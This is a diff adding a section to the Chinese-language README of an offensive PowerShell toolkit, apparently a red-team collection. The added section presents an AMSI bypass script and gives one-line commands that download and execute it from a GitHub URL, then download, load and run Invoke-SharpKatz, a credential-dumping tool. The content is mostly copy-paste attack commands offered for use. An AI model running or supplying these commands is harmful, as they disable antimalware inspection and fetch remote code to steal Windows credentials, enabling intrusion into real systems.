@@ -70,6 +70,18 @@ Import-Module .\Invoke-SharpUnhook.ps1
 ```
 ![image](https://user-images.githubusercontent.com/89376703/200115967-953b394b-90ad-477c-b12c-7370c73fe667.png)
 
+# 4.DelegateAmzzBypass.ps1
+
+DelegateAmzzBypass.ps1 bypass amsi脚本
+```
+iex(iwr -UseBasicParsing https://raw.githubusercontent.com/javelin266/Invoke-SharpOffensive/main/DelegateAmzzBypass.ps1)
+
+#然后导入sharpkatz.ps1 试试效果
+iex(iwr -UseBasicParsing https://raw.githubusercontent.com/javelin266/Invoke-SharpOffensive/main/Invoke-SharpKatz.ps1)
+Invoke-SharpKatz
+```
+![QQ图片20230617202602](https://github.com/javelin266/Invoke-SharpOffensive/assets/76693577/e52f9666-98cc-4cbe-a06b-39c46658de42)
+
 
 
 ### 总结
